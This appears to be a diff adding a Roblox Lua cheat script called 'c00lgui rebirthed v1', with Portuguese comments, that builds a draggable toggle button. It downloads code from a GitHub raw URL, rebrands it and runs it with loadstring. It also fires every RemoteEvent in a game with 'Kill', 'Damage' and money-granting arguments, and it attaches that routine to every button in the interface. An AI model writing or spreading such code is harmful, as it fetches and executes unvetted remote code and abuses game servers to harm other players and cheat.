@@ -1,0 +1,114 @@
+--[[
+    c00lgui rebirthed v1 by Blox1
+    VERSÃO v50: ULTRA SS-INJECTOR
+    Link Oficial: https://scriptblox.com/script/Universal-Script-c00lgui-rebirthed-v1-by-Blox1-80022
+]]
+
+local TITLE = "c00lgui rebirthed v1 by Blox1"
+local ICON_ID = "rbxassetid://158118263"
+local MUSIC_ID = "80427809663282"
+
+-- Notificação de Boas-Vindas
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "c00lgui SS Loaded!",
+    Text = "Welcome, " .. game:GetService("Players").LocalPlayer.Name .. "!",
+    Icon = ICON_ID,
+    Duration = 7
+})
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+-- FUNÇÃO DRAG
+local function MakeDraggable(obj)
+    local dragging, input, startPos, startInputPos
+    obj.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            startInputPos = i.Position
+            startPos = obj.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    obj.InputChanged:Connect(function(i)
+        if i == input and dragging then
+            local delta = i.Position - startInputPos
+            obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+-- ENGINE SS (TRANSFORMA TUDO EM SERVER-SIDE)
+local function FireSS()
+    for _, remote in pairs(game:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            pcall(function()
+                remote:FireServer("Kill", workspace:FindFirstChildOfClass("Player"))
+                remote:FireServer("Damage", workspace:FindFirstChildOfClass("Player"), 99999)
+                remote:FireServer("Add", "Money", 999999)
+            end)
+        end
+    end
+end
+
+-- CRIAR O ÍCONE REDONDO DO BLOX1
+if CoreGui:FindFirstChild("Blox1_Toggle") then CoreGui.Blox1_Toggle:Destroy() end
+local Screen = Instance.new("ScreenGui", CoreGui)
+Screen.Name = "Blox1_Toggle"
+
+local ImageBtn = Instance.new("ImageButton", Screen)
+ImageBtn.Size = UDim2.new(0, 60, 0, 60)
+ImageBtn.Position = UDim2.new(0.5, -30, 0, 20)
+ImageBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImageBtn.Image = ICON_ID
+Instance.new("UICorner", ImageBtn).CornerRadius = UDim.new(1, 0)
+local Stroke = Instance.new("UIStroke", ImageBtn)
+Stroke.Thickness = 2
+Stroke.Color = Color3.fromRGB(0, 255, 0)
+MakeDraggable(ImageBtn)
+
+-- CARREGAR ORIGINAL E MODIFICAR
+local function Start()
+    local success, code = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua")
+    end)
+    if success then
+        code = code:gsub("RC7", TITLE)
+        code = code:gsub("c00lgui", TITLE)
+        code = code:gsub("1837874542", MUSIC_ID)
+        loadstring(code)()
+    end
+end
+task.spawn(Start)
+
+-- MONITOR DE BOTÕES E IDENTIDADE
+task.spawn(function()
+    while task.wait(0.5) do
+        for _, v in pairs(CoreGui:GetDescendants()) do
+            if v:IsA("TextLabel") or v:IsA("TextButton") then
+                if (v.Text:find("c00l") or v.Text:find("RC7")) and v.Text ~= TITLE then
+                    v.Text = TITLE
+                end
+            end
+            if v:IsA("TextButton") and not v:FindFirstChild("SS_Tag") then
+                Instance.new("BoolValue", v).Name = "SS_Tag"
+                v.MouseButton1Click:Connect(FireSS)
+            end
+        end
+    end
+end)
+
+-- TOGGLE
+local existing = {}
+for _, v in pairs(CoreGui:GetChildren()) do existing[v] = true end
+ImageBtn.MouseButton1Click:Connect(function()
+    for _, v in pairs(CoreGui:GetChildren()) do
+        if not existing[v] and v ~= Screen and v:IsA("ScreenGui") then
+            v.Enabled = not v.Enabled
+        end
+    end
+    FireSS()
+end)
